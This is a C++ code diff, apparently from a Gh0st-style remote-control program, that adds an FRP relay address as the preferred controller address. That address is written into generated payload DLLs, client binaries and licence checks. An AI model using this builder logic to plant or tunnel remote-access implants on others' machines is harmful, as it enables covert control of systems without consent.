@@ -1836,6 +1836,13 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
         }
     }
 
+    // 获取有效地址（优先使用上级FRP配置）
+    std::string effectiveIP;
+    int effectivePort;
+    if (GetEffectiveMasterAddress(effectiveIP, effectivePort)) {
+        master = effectiveIP + ":" + std::to_string(effectivePort);
+    }
+
     UPDATE_SPLASH(50, "正在加载内核模块 (x86 DLL)...");
     g_2015RemoteDlg = this;
     m_ServerDLL[PAYLOAD_DLL_X86] = ReadKernelDll(false, true, master);
@@ -2417,6 +2424,28 @@ CMy2015RemoteDlg::FrpAutoConfig CMy2015RemoteDlg::ParseFrpAutoConfig(const std::
     }
 
     return cfg;
+}
+
+// 获取有效的主控地址（优先使用上级FRP配置）
+// 返回值：是否使用了FRP地址
+bool CMy2015RemoteDlg::GetEffectiveMasterAddress(std::string& outIP, int& outPort)
+{
+    // 默认使用本地配置
+    outIP = THIS_CFG.GetStr("settings", "master", "");
+    outPort = THIS_CFG.Get1Int("settings", "ghost", ';', 6543);
+    if (outPort <= 0) outPort = 6543;
+
+    // 检查是否有上级 FRP 配置
+    std::string frpConfigStr = THIS_CFG.GetStr("settings", "FrpConfig", "");
+    if (!frpConfigStr.empty()) {
+        FrpAutoConfig frpCfg = ParseFrpAutoConfig(frpConfigStr);
+        if (frpCfg.enabled && frpCfg.remotePort > 0) {
+            outIP = frpCfg.serverAddr;
+            outPort = frpCfg.remotePort;
+            return true;  // 使用了 FRP 地址
+        }
+    }
+    return false;  // 使用本地配置
 }
 
 // 日期字符串转 Unix 时间戳（当天 23:59:59）
@@ -3573,13 +3602,19 @@ BYTE* ReadExeFromResource(DWORD& outSize, int resourceId, int iType, int iStartu
         SAFE_DELETE(szBuffer);
         return NULL;
     }
+    // 获取有效地址（优先使用上级FRP配置）
+    std::string effectiveIP;
+    int effectivePort;
+    CMy2015RemoteDlg::GetEffectiveMasterAddress(effectiveIP, effectivePort);
+    if (effectiveIP.empty()) effectiveIP = "127.0.0.1";
+    std::string effectivePortStr = std::to_string(effectivePort);
+
     while (iOffset != -1 && dwFileSize >= sizeof(CONNECT_ADDRESS)) {
         CONNECT_ADDRESS* dst = (CONNECT_ADDRESS*)(pSearchStart + iOffset);
         dst->SetAdminId(GetMasterHash().c_str());
         memcpy(dst->szFlag, GetMasterId().c_str(), 16);
-        strcpy_s(dst->szServerIP, THIS_CFG.GetStr("settings", "master", "127.0.0.1").c_str());
-		auto ports = StringToVector(THIS_CFG.GetStr("settings", "ghost", "6543"), ';');
-        strcpy_s(dst->szPort, ports[0].c_str());
+        strcpy_s(dst->szServerIP, effectiveIP.c_str());
+        strcpy_s(dst->szPort, effectivePortStr.c_str());
         dst->Encrypt();
         dst->iType = iType;
         dst->iStartup = iStartup;
@@ -5465,8 +5500,9 @@ std::string CMy2015RemoteDlg::BuildAuthorizationResponse(const std::string& sn,
             // 没有 V2 私钥，说明是第一层服务端，可以返回 Authorization
             std::string storedAuthObf = THIS_CFG.GetStr("settings", "Authorization", "");
             std::string storedAuth = TcpClient::DeobfuscateAuthorization(storedAuthObf);  // 还原明文
-            std::string masterIP = GetFirstMasterIP(THIS_CFG.GetStr("settings", "master", ""));
-            int masterPort = THIS_CFG.Get1Int("settings", "ghost", ';', 6543);
+            std::string masterIP;
+            int masterPort;
+            GetEffectiveMasterAddress(masterIP, masterPort);  // 优先使用上级FRP配置
             std::string hmacServer = masterIP.empty() ? "" : masterIP + ":" + std::to_string(masterPort);
             if (!storedAuth.empty() && !hmacServer.empty()) {
                 auto authParts = splitString(storedAuth, '|');
@@ -6639,8 +6675,10 @@ bool GenerateHashHeaderFile(const std::string& headerPath,
 
 void CMy2015RemoteDlg::OnToolGenMaster()
 {
-    // 主控程序公网IP
-    std::string master = THIS_CFG.GetStr("settings", "master", "");
+    // 主控程序公网IP（优先使用上级FRP配置）
+    std::string master;
+    int port;
+    GetEffectiveMasterAddress(master, port);
     if (master.empty())	{
         MessageBoxL("请通过菜单设置当前主控程序的公网地址（域名）! 此地址会写入即将生成的主控程序中。"
                     "\n只有正确设置公网地址，才能在线延长由本程序所生成的主控程序的有效期。", "提示", MB_ICONINFORMATION);
@@ -6760,7 +6798,6 @@ void CMy2015RemoteDlg::OnToolGenMaster()
             return;
         }
     }
-    int port = THIS_CFG.Get1Int("settings", "ghost", ';', 6543);
     std::string id = genHMAC(pwdHash, m_superPass);
     Validation verify(atof(newDays), master.c_str(), port<=0 ? 6543 : port, id.c_str(), newMaxDepth);
     if (!WritePwdHash(curEXE + iOffset, pwdHash, verify)) {
